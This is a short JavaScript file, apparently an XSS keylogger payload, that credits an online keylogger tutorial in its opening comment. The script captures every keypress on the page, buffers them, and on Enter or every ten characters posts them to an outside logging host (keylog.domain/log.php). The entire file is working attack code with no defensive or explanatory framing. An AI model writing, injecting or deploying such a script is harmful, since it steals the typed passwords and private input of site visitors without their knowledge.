/* totally not based on https://wiremask.eu/articles/xss-keylogger-turorial/ */
var buffer = "";

function PostData() {
    var xhttp = new XMLHttpRequest();
      xhttp.open("POST", "http://keylog.domain/log.php", true);
      xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      xhttp.send("group=XX"+"&data=" + buffer);
}

document.onkeypress = function(e) {
	buffer += e.key;
	if(e.keyCode == 13 || buffer.length >= 10)
	{
		PostData();
		buffer = "";
	}
}
